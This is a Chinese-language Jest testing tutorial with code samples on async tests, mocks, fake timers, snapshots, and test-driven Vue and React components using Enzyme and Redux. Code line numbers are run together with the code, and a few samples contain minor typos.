expect(101).not.toBeWithinRange(0, 100) expect(&#123; apples: 6, bananas: 3 &#125;).toEqual(&#123; apples: expect.toBeWithinRange(1, 10), bananas: expect.not.toBeWithinRange(11, 20), &#125;)&#125;) 异步扩展,需要结合 async和 await函数来使用 123456789101112131415161718expect.extend(&#123; async toBeDivisibleByExternalValue(reveived)&#123; // 异步获取的除数 const externalValue = await getExternalValueFromRemoteSource(); const pass = received % externalValue == 0; if(pass)&#123; return&#123; message:()=&gt;`期待$&#123;received&#125;不被$&#123;externalValue&#125;整除`, pass &#125; &#125;else&#123; return&#123; message:()=&gt;`期待$&#123;received&#125;被$&#123;externalValue&#125;整除`, pass &#125; &#125; &#125;&#125;) 更多 测试异步代码回调形式 12345678910111213141516171819202122232425262728293031// fetchData.jsimport request from '@/utils/request';const fetchData = (cb) =&gt; &#123; request('http://www.dell-lee.com/react/api/demo.json').then(res =&gt; &#123; if (res.data) cb(res.data) &#125;)&#125;export default fetchData// fetchData.test.jsimport fetchData from './fetchData'// 错误test('fetch 返回结果为 &#123;success: true&#125;', () =&gt; &#123; fetchData(data =&gt; &#123; expect(data).toEqual(&#123; success: true &#125;) &#125;)&#125;)// 回调类型异步函数test('fetch 返回结果为 &#123;success: true&#125;', (done) =&gt; &#123; fetchData(data =&gt; &#123; expect(data).toEqual(&#123; success: true &#125;) done(); &#125;)&#125;) Promise 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// fetchData.jsimport request from '@/utils/request';const fetchData = () =&gt; request('http://www.dell-lee.com/react/api/demo.json')export default fetchData//fetchData.test.jsimport fetchData from './fetchData'// Promisetest('fetch 返回结果为 &#123;success: true&#125;', () =&gt; &#123; return fetchData().then(res =&gt; &#123; expect(res.data).toEqual(&#123; success: true &#125;) &#125;)&#125;)// 测试404test('fetchData 返回结果为404', () =&gt; &#123; // 要求至少跑一次 expect expect.assertions(1); return fetchData().catch(e =&gt; &#123; expect(e.toString().indexOf('404') &gt; -1).toBe(true) &#125;)&#125;)// .resolves / .rejectstest('fetch 返回结果为 &#123;success: true&#125;', () =&gt; &#123; return expect(fetchData()).resolves.toMatchObject(&#123; data: &#123; success: true &#125; &#125;)&#125;)test('fetchData 返回结果为404', () =&gt; &#123; return expect(fetchData()).rejects.toThrow()&#125;)// Async/Awaittest('fetch 返回结果为 &#123;success: true&#125;', async () =&gt; &#123; await expect(fetchData()).resolves.toMatchObject(&#123; data: &#123; success: true &#125; &#125;)&#125;)test('fetchData 返回结果为404', async () =&gt; &#123; await expect(fetchData()).rejects.toThrow()&#125;)// 另一种 Async/Awaittest('fetch 返回结果为 &#123;success: true&#125;', async () =&gt; &#123; const res = await fetchData() expect(res.data).toEqual(&#123; success: true &#125;)&#125;)test('fetchData 返回结果为404', async () =&gt; &#123; expect.assertions(1); try &#123; await fetchData() &#125; catch (e) &#123; await expect(e.toString()).toEqual('Error: Request failed with status code 404') &#125;&#125;) 钩子函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// Couter.jsclass Counter &#123; constructor() &#123; this.number = 0; &#125; addOne() &#123; this.number += 1; &#125; addTwo() &#123; this.number += 2; &#125; minusOne() &#123; this.number -= 1; &#125; minusTwo() &#123; this.number -= 2; &#125;&#125;export default Counter;// Couter.test.jsimport Counter from './Couter';describe('测试 Counter',()=&gt;&#123; let couter; // 所有测试开始之前 beforeAll(()=&gt;&#123; couter = new Counter(); &#125;) // 每个测试用例开始之前 beforeEach(()=&gt;&#123; // 每次测试都会生成一个新的 couter couter = new Counter(); &#125;) // 每个测试用例结束之后 afterEach(()=&gt;&#123; &#125;) // 所有测试结束之后 afterAll(()=&gt;&#123; &#125;) describe('测试增加相关代码',()=&gt;&#123; test('测试 Conter 中的 addOne 方法', () =&gt; &#123; couter.addOne(); expect(couter.number).toBe(1) &#125;) test('测试 Conter 中的 addTwo 方法', () =&gt; &#123; couter.addTwo(); expect(couter.number).toBe(2) &#125;) &#125;) describe('测试减少相关代码',()=&gt;&#123; test('测试 Conter 中的 minusOne 方法', () =&gt; &#123; couter.minusOne(); expect(couter.number).toBe(-1) &#125;) test('测试 Conter 中的 minusTwo 方法', () =&gt; &#123; couter.minusTwo(); expect(couter.number).toBe(-2) &#125;) &#125;) &#125;) describe 里面就是一个作用域，嵌套作用域可以有多个钩子函数，钩子函数执行顺序由外到内 test.only，只执行某个测试用例 1234567891011describe('测试减少相关代码',()=&gt;&#123; test.only('测试 Conter 中的 minusOne 方法', () =&gt; &#123; couter.minusOne(); expect(couter.number).toBe(-1) &#125;) test('测试 Conter 中的 minusTwo 方法', () =&gt; &#123; couter.minusTwo(); expect(couter.number).toBe(-2) &#125;)&#125;) Mock 捕获函数的调用，this 指向，调用顺序 自由设置返回结果 改变内部函数的实现 基本模拟-导入函数1234567891011121314151617181920212223242526272829303132// democonst runCallback = (cb) =&gt; &#123; cb();&#125;export default runCallback//demo.test.jsimport runCallback from './demo';describe('测试 runCallback 方法', () =&gt; &#123; test('runCallback被调用,并只调用了一次',()=&gt;&#123; // mock 函数，捕获函数的调用 const func = jest.fn(); // 方法返回一次 值 Haha，mockReturnValue则是都返回，也可以在 jest.fn(()=&gt;&#123;return 'Haha'&#125;)定义 func.mockReturnValueOnce('Haha') runCallback(func) expect(func).toBeCalled() expect(func.mock.calls.length).toBe(1) expect(func.mock.results[0].value).toBe('Haha') &#125;)&#125;)console.log(func.mock)/** ● Console console.log src/lesson2/demo.test.js:14 &#123; calls: [ [] ], instances: [ undefined ], invocationCallOrder: [ 1 ], results: [ &#123; type: 'return', value: 'Haha' &#125; ] &#125;*/ 修改原来函数的返回123456789101112131415161718192021222324// xx.jsimport axios from 'axios'const fetchData = ()=&gt;&#123; axios.get('/').then(res=&gt;res.data)&#125;// (function()&#123;return '123' &#125;)()export default fetchData;// xx.test.jsimport fetchData from './xx.js'import axios from 'axios'ject.mock('axios')test('fetchData 测试',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;) __mocks__文件夹123456// __mock__/xx.jsconst fetchData = ()=&gt;&#123; return new Promise((resolved,reject)=&gt;&#123; resolve("(function()&#123;return '123' &#125;)()") &#125;)&#125; 接着改测试，模拟函数 123456789101112// xx.test.jsjest.mock('./xx')import fetchData from './xx.js'test('fetchData 测试',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;) 上述函数顶部那步模拟也可以通过在 jest.config.js 中修改配置 automock：true 改为自动模拟，那么引入对应的函数的时候就会自动去 __mocks__文件夹里面去寻找对应的模拟函数。注意一旦开启这个配置，需要启动才会生效，另外也会导致很多测试需要重新修改。 同时存在__mocks__以及导入函数在原来 xx.js 基础上面新增 一个 getNumber函数 1234567891011121314xx.jsimport axios from 'axios'const fetchData = ()=&gt;&#123; axios.get('/').then(res=&gt;res.data)&#125;// (function()&#123;return '123' &#125;)()const getNumber = ()=&gt; 123export &#123; fetchData, getNumber&#125;; 接着修改测试用例 123456789101112131415// xx.test.jsjest.mock('./xx')import fetchData from './xx.js'test('fetchData 测试',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;)test('getNumber 测试',()=&gt;&#123; expect(getNumber()).toBe(123)&#125;) 上述代码会报错，getNumebr 找不到对应的函数，因为测试用例还是会去__mocks__ 文件夹去寻找 getNumber。但是我们只希望模拟异步的函数，对于同步函数希望通过导入的方式来测试，那么就从原来的js文件中导入 getNumber 123456789101112131415// xx.test.jsjest.mock('./xx')import fetchData from './xx.js'const &#123; getNumber &#125; = jest.requireActual('./xx')test('fetchData 测试',()=&gt;&#123; axios.get.mockResolvedValue(&#123; data:"(function()&#123;return '123' &#125;)()" &#125;) return fetchData().then(data=&gt;&#123; expect(eval(data)).toEqual('123') &#125;)&#125;)test('getNumber 测试',()=&gt;&#123; expect(getNumber()).toBe(123)&#125;) Mock Timer写一个 setTimeout 函数 123456// timer.jsexport default (cb)=&gt;&#123; setTimeout(()=&gt;&#123; cb() &#125;,3000)&#125; 测试用例 123456789// timer.test.jsimport timer from './timer'test('timer 测试',(done)=&gt;&#123; timer(()=&gt;&#123; expect(2).toBe(1) done(); &#125;)&#125;) 上面的测试用例会直接通过， timer是一个异步函数，并不会执行函数体内的内容，需要像之前的异步函数一样，加个 done 参数 12345678import timer from './timer'test('timer 测试',(done)=&gt;&#123; timer(()=&gt;&#123; expect(2).toBe(1) done(); &#125;)&#125;) 接着测试用例便会运行，并报错 123456789101112131415161718192021222324252627282930FAIL src/lesson3/timer.test.js (7.997s) ● Console console.error node_modules/_jsdom@11.12.0@jsdom/lib/jsdom/virtual-console.js:29 Error: Uncaught [Error: expect(received).toBe(expected) // Object.is equality Expected: 1 Received: 2] at reportException (F:\赖彬鸿\git-project\usual\Egret-Project\FontendTest\node_modules\_jsdom@11.12.0@jsdom\lib\jsdom\living\helpers\runtime-script-errors.js:66:24) at Timeout.callback [as _onTimeout] (F:\赖彬鸿\git-project\usual\Egret-Project\FontendTest\node_modules\_jsdom@11.12.0@jsdom\lib\jsdom\browser\Window.js:680:7) at ontimeout (timers.js:436:11) at tryOnTimeout (timers.js:300:5) at listOnTimeout (timers.js:263:5) at Timer.processTimers (timers.js:223:10) &#123; Error: expect(received).toBe(expected) // Object.is equality Expected: 1 Received: 2 at toBe (F:\赖彬鸿\git-project\usual\Egret-Project\FontendTest\src\lesson3\timer.test.js:5:15) at cb (F:\赖彬鸿\git-project\usual\Egret-Project\FontendTest\src\lesson3\timer.js:3:5) at Timeout.callback [as _onTimeout] (F:\赖彬鸿\git-project\usual\Egret-Project\FontendTest\node_modules\_jsdom@11.12.0@jsdom\lib\jsdom\browser\Window.js:678:19) at ontimeout (timers.js:436:11) at tryOnTimeout (timers.js:300:5) at listOnTimeout (timers.js:263:5) at Timer.processTimers (timers.js:223:10) matcherResult: &#123; actual: 2, expected: 1, message: [Function], name: 'toBe', pass: false &#125; &#125; 也可以通过模拟 timer 这类异步函数，来达到目的 123456789101112// timer.test.jsimport timer from './timer'// mock timerjest.useFakeTimers()test('timer 测试',()=&gt;&#123; const fn = jest.fn(); timer(fn) // 快速运行所有Timer jest.runAllTimers(); expect(fn).toHaveBeenCalledTimes(1)&#125;) 对于嵌套 timer 异步函数，jest.runOnlyPendingTimers可以让只最外层的第一个 timer 运行。 另外还有快进时间的api,jest.advanceTimersByTime(n) 12345678910// timer.test.jsimport timer from './timer'jest.useFakeTimers()test('timer 测试',()=&gt;&#123; const fn = jest.fn(); timer(fn) jest.advanceTimersByTime(3000) expect(fn).toHaveBeenCalledTimes(1)&#125;) 嵌套 timer 的测试用例结合 钩子beforeEach以及两个上面讲的api的例子 12345678910111213141516171819202122232425262728293031// timer.jsexport default (cb)=&gt;&#123; setTimeout(()=&gt;&#123; cb() setTimeout(()=&gt;&#123; cb() &#125;,3000) &#125;,3000)&#125;// timer.test.jsimport timer from './timer'beforeEach(()=&gt;&#123; jest.useFakeTimers()&#125;)test('timer 测试-runAllTimers',()=&gt;&#123; const fn = jest.fn(); timer(fn) jest.runAllTimers(); expect(fn).toHaveBeenCalledTimes(2)&#125;)test('timer 测试-advanceTimersByTime',()=&gt;&#123; const fn = jest.fn(); timer(fn) jest.advanceTimersByTime(3000) expect(fn).toHaveBeenCalledTimes(1) jest.advanceTimersByTime(3000) expect(fn).toHaveBeenCalledTimes(2)&#125;) Mock FuntionsMock 函数可以轻松测试代码之间的连接——实现方式包括：擦除函数实际实现、捕获对函数的调用（以及在这些调用中传递的参数）、在使用 new 实例化时捕获构造函数的实例，允许测试时配置返回值 模拟函数测试函数 forEach的内部实现，这个函数为传入的数组中的每个元素调用一次回调函数 12345function forEach(items,callback)&#123; for(let index=0;index&lt;items.length;index+=1)&#123; callback(item[index]) &#125;&#125; 为了测试此函数，可以使用一个 mock 函数，然后检查 mock 函数的状态来确保回调函数如期调用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const mockCallback = jest.fn(x =&gt; 42 + x);forEach([0, 1], mockCallback)// 此mock函数被调用了两次expect(mockCallback.mock.calls.length).toBe(2)console.log(mockCallback)/** &#123; [Function: mockConstructor] _isMockFunction: true, getMockImplementation: [Function], mock: [Getter/Setter], mockClear: [Function], mockReset: [Function], mockRestore: [Function], mockReturnValueOnce: [Function], mockResolvedValueOnce: [Function], mockRejectedValueOnce: [Function], mockReturnValue: [Function], mockResolvedValue: [Function], mockRejectedValue: [Function], mockImplementationOnce: [Function], mockImplementation: [Function], mockReturnThis: [Function], mockName: [Function], getMockName: [Function] &#125;*/// 第一次调用函数时的第一个参数是 0expect(mockCallback.mock.calls[0][0]).toBe(0)console.log(mockCallback.mock)/** &#123; calls: [ [ 0 ], [ 1 ] ], instances: [ undefined, undefined ], invocationCallOrder: [ 1, 2 ], results: [ &#123; type: 'return', value: 42 &#125;, &#123; type: 'return', value: 43 &#125; ] &#125;*/// 第二次调用函数时的第一个参数是1expect(mockCallback.mock.calls[1][0]).toBe(1)// 第一次函数调用的返回值是 42expect(mockCallback.mock.results[0].value).toBe(42) .mock属性所有 mock 函数都有这个特殊的 .mock属性，它保存了关于此函数如何调用、调用时的返回值的信息。.mock属性还追踪每次调用时 this的值，所以我们同样也可以检视（inspect）this 12345678const myMock = jest.fn();const a = new myMock();const b = &#123;&#125;;const bound = myMock.bind(b)bound();console.log(myMock.mock.instances)// [ mockConstructor &#123;&#125;, &#123;&#125; ] 模拟返回值12345678910const myMock = jest.fn();console.log(myMock())// undefinedmyMock .mockReturnValueOnce(10) .mockReturnValueOnce('x') .mockReturnValue(true)console.log(myMock(), myMock(), myMock(), myMock());// 10, 'x', true, true 结合一些函数灵活模拟 12345678910const filterTestFn = jest.fn();filterTestFn.mockReturnValueOnce(true).mockReturnValueOnce(false)const result = [11,12].filter(filterTestFn)console.log(result)// [11]console.log(filterTestFn.mock.calls)// [[11],[12]] 模拟模块123456789// users.jsimport axios from 'axios'class Users &#123; static call()&#123; return axios.get('/user.json').then(res=&gt;res.data) &#125;&#125;export default Users 模拟 axios.get 返回一个假的 response 1234567891011// users.test.jsimport axios from 'axios';import Users from './users';jest.mock(axios);test('should fetch users',()=&gt;&#123; const users = [&#123;name:'Bob'&#125;] const res = &#123;data:users&#125; axios.get.mockResolvedValue(res) return Users.all().then(data=&gt;expect(data).toEqual(users))&#125;) 模拟实现通过模拟函数 jest.fn或者mockImplementationOnce方法来完成 1234const myMockFn = jest.fn(cb=&gt; cb(null,true))myMockFn((err,val)=&gt;console.log(val))// true mockImplementation当您需要定义从另一个模块创建的模拟函数的默认实现时，该方法很有用 123456789101112// foo.jsmodule.exports = function()&#123; // some implementation&#125;// test.jsjest.mock('../foo') // 这个会自动模拟const foo = require('../foo')foo.mockImplementation(()=&gt;42)foo();// 42 当需要重新创建模拟函数的复杂行为，以便多个函数调用产生不同的结果时，可以使用 mockImplementationOnce方法 12345678const myMockFn = jest .fn() .mockImplementationOnce(cb =&gt; cb(null,true)) .mockImplementationOnce(cb =&gt; cb(null,fase))myMockFn((err, val) =&gt; console.log(val));// truemyMockFn((err, val) =&gt; console.log(val));// false .mockReturnThis()返回 this 123456789const myObj = &#123; myMethod: jest.fn().mockReturnThis(),&#125;// 与下面实现相同const otherObj = &#123; myMethod: jest.fn(function()&#123; return this; &#125;)&#125; 模拟函数名称选择为模拟函数提供一个名称，改名称将在测试错误输出中显示，而不是 jest.fn()，使用这个可以快速识别在测试输出中报告错误的模拟函数 12345const myMockFn = jest.fn().mockReturnValue('default').mockImplementation(x =&gt; x + 42).mockName('add42') Snapshot快照适合测试配置文件 123456789101112131415161718// xx.jsexport const generateConfig = () =&gt;&#123; return &#123; server:'http://localhost', port:8080 &#125;&#125;//xx.test.jsimport &#123; generateConfig &#125; from './snopshot';test('测试 generateConfig 函数',()=&gt;&#123; expect(generateConfig()).toMatchSnapshot(); expect(generateConfig()).toEqual(&#123; server:'http://localhost', port:8080 &#125;)&#125;) jest --watchAll里面出现了 u、i模式分别对应 更新所有的快照跟更新单个快照 安装 prettier,运行 toMatchInlineSnapshot，会将 快照自动存到代码下面 123456789101112131415test('测试 generateConfig 函数', () =&gt; &#123; expect(generateConfig()).toMatchInlineSnapshot( &#123; time: expect.any(Date), &#125;, // 下面是自动生成的 ` Object &#123; "port": 8080, "server": "http://localhost", "time": Any&lt;Date&gt;, &#125; ` );&#125;); ES6 类12345678910111213// util.jsclass Util &#123; init()&#123;&#125; a()&#123; // 异常复杂 &#125; b()&#123; // 异常复杂 &#125;&#125;export default Util; 在别的函数里面使用这个类 12345678910// useUtil.jsimport Util from './util'const useUtil = (a,b) =&gt;&#123; const util = new Util() util.a(a) util.b(b)&#125;export default useUtil; 写这个使用类的函数的测试用例的时候，我们会发现这个函数因为使用到了类里面的函数，而函数又很复杂，直接调用会损耗性能。所以这里我们用几种方法来模拟 1234567891011121314151617181920212223242526// useUtil.test.jsjest.mock('./util')// jest.mock 发现 util 是一个类，会自动把类的构造函数方法变成 jest.fn()// const Util = jest.fn();// Util.a = jest.fn()// Util.b = jest.fn()import Util from './util'import useUtil from './useUtil'test('测试 useUtil',()=&gt;&#123; useUtil(); expect(Util).toHaveBeenCalled(); console.log(Util.mock) expect(Util.mock.instances[0].a).toHaveBeenCalled() expect(Util.mock.instances[0].b).toHaveBeenCalled()&#125;)/** ● Console console.log src/lesson3/useUtil.test.js:12 &#123; calls: [ [] ], instances: [ Util &#123; init: [Function], a: [Function], b: [Function] &#125; ], invocationCallOrder: [ 1 ], results: [ &#123; type: 'return', value: undefined &#125; ] &#125;*/ 另一种方法就是通过在 __mocks__文件夹中模拟 123456// __mocks__/util.jsconst Util = jest.fn();Util.prototype = jest.fn();Util.prototype = jest.fn();export default Util 还有一种写法，是在原来的测试用例修改 1234567// useUtil.test.jsjest.mock('./util',()=&gt; &#123; const Util = jest.fn(); Util.prototype = jest.fn(); Util.prototype = jest.fn(); return Util;&#125;) DOM操作12345678910111213141516171819// dom.jsimport $ from 'jquery'const addDivToBody = () =&gt;&#123; $('body').append('&lt;div/&gt;')&#125;export default addDivToBody// dom.test.js// node 本身不具备 dom// jest 在 node 环境下模拟了一套 dom 的 api,jsDomimport $ from 'jquery'import addDivToBody from addDivToBody;test('测试 addDivToBody',()=&gt;&#123; addDivToBody(); expect($('body').find('div').length).toBe(1)&#125;) TDD（测试驱动开发）全称：Test Driven Development 开发流程（Red-Green Development） 编写测试用例 运行测试，测试用例无法通过测试 编写代码，使测试用例通过测试 优化代码，完成开发 重复上述步骤 优势 长期减少回归 bug 代码质量更好（组织、可维护性） 测试覆盖率高 错误测试代码不容易出现 Vue TDD开始 1234# 安装脚手架npm i @vue/cli@3.8.4 -g# 安装vue,可以选择默认配置，也可以自定义配置vue create vue-jest @vue/test-utils123456789101112131415161718192021222324252627// HelloWorld.test.jsimport &#123; shallowMount &#125; from '@vue/test-utils'import HelloWorld from '@/components/HelloWorld.vue'describe('HelloWorld.vue', () =&gt; &#123; /** 如果不使用 @vue/test-utils * import Vue from 'vue' * it('renders props.msg when passed', () =&gt; &#123; const root = document.createElement('div') root.className = 'root' document.body.appendChild(root) new Vue(&#123; render: h =&gt; h(HelloWorld, &#123; props: &#123; msg: 'laibh' &#125; &#125;) &#125;).$mount('.root') expect(document.getElementsByClassName('hello').length).toBe(1) &#125;) */ const msg = 'new message' const wrapper = shallowMount(HelloWorld, &#123; propsData: &#123; msg &#125; &#125;) expect(wrapper.text()).toMatch(msg)&#125;) shallowMount浅层渲染，只渲染第一层，不渲染子组件，适合单元测试 mount则会渲染子组件，适合集成测试 开发 Header 组件测试用例先行 1234567891011121314151617181920212223242526272829303132333435363738394041// Header.test.jsimport &#123; shallowMount &#125; from '@vue/test-utils'import Header from '@/components/Header/Header.vue'describe('测试 Header 组件', () =&gt; &#123; it('Header 包含 Input 框', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') expect(input.exists()).toBe(true) &#125;) it('Header 中 Input 初始内容为空', () =&gt; &#123; const wrapper = shallowMount(Header) const inputValue = wrapper.vm.$data.inputValue expect(inputValue).toBe('') &#125;) it('Header 中 Input 框值发生变化，值应该也跟着改变', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') input.setValue('laibh') const inputValue = wrapper.vm.$data.inputValue expect(inputValue).toBe('laibh') &#125;) it('Header 中 Input 框输入回车，无内容时无反应', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') input.setValue('') input.trigger('keyup.enter') expect(wrapper.emitted().add).toBeFalsy() &#125;) it('Header 中 Input 框输入回车，有内容时向外触发事件,同时清空 inputValue', () =&gt; &#123; const wrapper = shallowMount(Header) const input = wrapper.find('[data-test="input"]') input.setValue('laibh') input.trigger('keyup.enter') expect(wrapper.emitted().add).toBeTruthy() expect(wrapper.vm.$data.inputValue).toBe('') &#125;)&#125;) 根据测试用例写代码 1234567891011121314151617181920212223242526272829// Header.vue&lt;template&gt; &lt;div&gt; &lt;input data-test=&quot;input&quot; v-model=&quot;inputValue&quot; @keyup.enter=&quot;addTodoItem&quot; /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;Header&quot;, props: &#123;&#125;, data() &#123; return &#123; inputValue: &quot;&quot; &#125;; &#125;, methods: &#123; addTodoItem() &#123; if (this.inputValue) &#123; this.$emit(&quot;add&quot;, this.inputValue); this.inputValue = &quot;&quot;; &#125; &#125; &#125;&#125;;&lt;/script&gt;&lt;style scoped lang=&quot;less&quot;&gt;&lt;/style&gt; 测试覆盖率12345678910// jest.config.jsmodule.exports = &#123; collectCoverageFrom: ['**/*.&#123;js,vue&#125;', '!**/node_modules/**'],&#125;// package.json "scripts": &#123; "test:cov": "vue-cli-service test:unit --coverage" &#125;, React TDDEnzymegithub 12# 安装 npm i --save-dev enzyme enzyme-adapter-react-16 同样，shallow适合单元测试，mount则是集成测试 例子： 123456789101112131415161718192021222324252627282930313233// App.jeimport React from 'react';function App() &#123; return ( // 使用的data-test=xxx 等属性可以做到解耦，不会因为改变样式名而发生改变，另外也不会被hash掉 &lt;div className="app-container" title="laibh" data-test="container"&gt; hello world &lt;/div&gt; );&#125;export default App;// App.test.jsimport React from 'react';import App from './App';import Enzyme, &#123; shallow &#125; from 'enzyme';import Adapter from 'enzyme-adapter-react-16';Enzyme.configure(&#123; adapter: new Adapter() &#125;);it('renders without crashing', () =&gt; &#123; const wrapper = shallow(&lt;App /&gt;) // 输出整个内容字符串 console.log(wrapper.debug()) /** &lt;div className="app-container" title="laibh" data-test="container"&gt; hello world &lt;/div&gt; */ expect(wrapper.find('[data-test="container"]').length).toBe(1) expect(wrapper.find('[data-test="container"]').prop('title')).toBe('laibh')&#125;); 另外它海域一些扩展 API，例如 jest-enzyme，让语法易懂简洁 123456789101112131415161718// App.test.jsimport React from 'react';import App from './App';import Enzyme, &#123; shallow &#125; from 'enzyme';import Adapter from 'enzyme-adapter-react-16';Enzyme.configure(&#123; adapter: new Adapter() &#125;);it('renders without crashing', () =&gt; &#123; const wrapper = shallow(&lt;App /&gt;) console.log(wrapper.debug()) const container = wrapper.find('[data-test="container"]') expect(container.length).toBe(1) expect(container.prop('title')).toBe('laibh') // 等同上面两句 expect(container).toExist() expect(container).toHaveProp('title', 'laibh')&#125;); 别忘记在 jest.config.js里面进行配置 123module.exports = &#123; setupFilesAfterEnv: ['./node_modules/jest-enzyme/lib/index.js'],&#125; 开发 Header 组件同样测试先行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import React from 'react';import Header from '../../index';import &#123; shallow &#125; from 'enzyme';let wrapper;let inputElem;describe('测试 Header 组件', () =&gt; &#123; beforeEach(() =&gt; &#123; wrapper = shallow(&lt;Header /&gt;) inputElem = wrapper.find('[data-test="input"]') &#125;) it('正常渲染', () =&gt; &#123; expect(wrapper).toMatchSnapshot() &#125;); it('包含一个 input', () =&gt; &#123; expect(inputElem).toExist() &#125;); it('input初始化内容应该为空', () =&gt; &#123; expect(inputElem.prop('value')).toBe('') &#125;); it('当用户输入时，input内容会跟着变化', () =&gt; &#123; const value = '哈哈哈' inputElem.simulate('change', &#123; target: &#123; value &#125; &#125;) expect(wrapper.state('value')).toBe(value) &#125;); it('当用户输入后，键入回车，如果 input 没有内容，则不操作', () =&gt; &#123; const fn = jest.fn(); const wrapper = shallow(&lt;Header addUndoItem=&#123;fn&#125; /&gt;) wrapper.setState(&#123; value: '' &#125;) const inputElem = wrapper.find('[data-test="input"]') inputElem.simulate('keyUp', &#123; keyCode: 13 &#125;) expect(fn).not.toBeCalled() &#125;); it('当用户输入后，键入回车，如果 input 有内容，addUndoItem应该被调用,然后input被清空', () =&gt; &#123; const fn = jest.fn(); const wrapper = shallow(&lt;Header addUndoItem=&#123;fn&#125; /&gt;) const value = 'haha'; wrapper.setState(&#123; value &#125;) const inputElem = wrapper.find('[data-test="input"]') inputElem.simulate('keyUp', &#123; keyCode: 13 &#125;) expect(fn).toBeCalled() expect(fn).toBeCalledWith(value) const newInputElem = wrapper.find('[data-test="input"]') expect(newInputElem.prop('value')).toBe('') &#125;);&#125;); 根据测试写代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445import React, &#123; Component &#125; from 'react';import styles from './index.less'class Header extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; value: '' &#125; &#125; handleInputKeyUp = (e) =&gt; &#123; const &#123; value &#125; = this.state; const &#123; addUndoItem &#125; = this.props; if (e.keyCode === 13 &amp;&amp; value) &#123; addUndoItem(value) this.setState(&#123; value: '' &#125;) &#125; &#125; handleInputChange = (e) =&gt; &#123; this.setState(&#123; value: e.target.value &#125;) &#125; render() &#123; const &#123; value &#125; = this.state; return ( &lt;div className=&#123;styles.header&#125;&gt; &lt;div className=&#123;styles.headerContent&#125;&gt; TodoList &lt;input className=&#123;styles.headerInput&#125; data-test='input' value=&#123;value&#125; onChange=&#123;this.handleInputChange&#125; onKeyUp=&#123;this.handleInputKeyUp&#125; placeholder='Add Todo' /&gt; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125;export default Header; TDD 小结优势：代码质量提高 单元测试 测试覆盖率高，业务耦合度高，代码量大，过于独立 BDD（行为驱动开发）全称：Behavior Driven Development 集成测试1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// vue integration/todoList import &#123; mount &#125; from '@vue/test-utils'import TodoList from '../../TodoList' it(` 1.用户会在 header输入框输入内容 2.用户会点击回车按钮 3.列表项应该增加用户输入内容的列表项 `, () =&gt; &#123; const wrapper = mount(&lt;TodoList /&gt;); const inputElem = wrapper.findAll('[data-test="header-input"]').at(0) const content = 'haha' inputElem.setValue(content) inputElem.trigger('change') inputElem.trigger('keyup.enter') const listItems = wrapper.findAll('[data-test="list-item"]').at(0) expect(listItems.length).toBe(1) expect(listItems.at(0).text()).toContain(content) &#125;)// react integration/todoList import React from 'react';import &#123; mount &#125; from 'enzyme';import TodoList from './../../index';describe('集成测试：TodoList', () =&gt; &#123; let wrapper; beforeEach(() =&gt; &#123; wrapper = mount(&lt;TodoList /&gt;) &#125;) it(` 1.用户会在 header输入框输入内容 2.用户会点击回车按钮 3.列表项应该增加用户输入内容的列表项 `, () =&gt; &#123; const value = 'haha' const headerInput = wrapper.find('[data-test="header-input"]') headerInput.simulate('change', &#123; target: &#123; value &#125; &#125;) // 按下回车键，keyCode为13 headerInput.simulate('keyUp', &#123; keyCode: 13 &#125;) // undoListItem const listItems = wrapper.find('[data-test="list-item"]') expect(listItems.length).toBe(1) expect(listItems.at(0).text()).toContain(value) &#125;)&#125;) TDD 与 BDD 比较TDD 先写测试再写代码 一般结合单元测试使用，是白盒测试 测试重点在代码 安全感低 速度快 BDD 先写代码再写测试 一般结合集成测试使用，是黑盒测试 测试重点在 UI (DOM) 安全感高 速度慢 Redux相关测试增加 redux 在项目 createStore 1234567891011// src/store/createStoreimport &#123; createStore, combineReducers &#125; from 'redux'import &#123; reducer as todoReducer &#125; from '../containers/TodoList/store'const reducer = combineReducers(&#123; todo: todoReducer&#125;)const store = createStore(reducer, window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__());export default store; store/actions.js 123456import &#123; CHANGE_INPUT_VALUE &#125; from './constants';export const changeInputValue = value =&gt; (&#123; type: CHANGE_INPUT_VALUE, value&#125;) store/constants.js 1export const CHANGE_INPUT_VALUE = 'CHANGE_INPUT_VALUE' store/reducer.js 12345678910111213141516import &#123; CHANGE_INPUT_VALUE &#125; from './constants';const initialState = &#123; inputValue: ''&#125;export default (state = initialState, action) =&gt; &#123; switch (action.type) &#123; case CHANGE_INPUT_VALUE: return &#123; inputValue: action.value &#125;; default: return state; &#125;&#125; store/index.js 12345import reducer from './reducer'import * as actions from './actions'export &#123; reducer, actions &#125; TodoList/index.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import React, &#123; Component &#125; from 'react';import Header from './../../components/Header/index';import UndoList from './../../components/UndoList/index';import styles from './index.less'class TodoList extends Component &#123; constructor(props) &#123; super(props) this.state = &#123; undoList: [] &#125; &#125; handledeleteItem = (index) =&gt; &#123; const &#123; undoList &#125; = this.state; const newList = undoList.filter((item, itemIndex) =&gt; itemIndex !== index) this.setState(&#123; undoList: newList &#125;) &#125; handleStatusChange = (index) =&gt; &#123; const &#123; undoList &#125; = this.state; 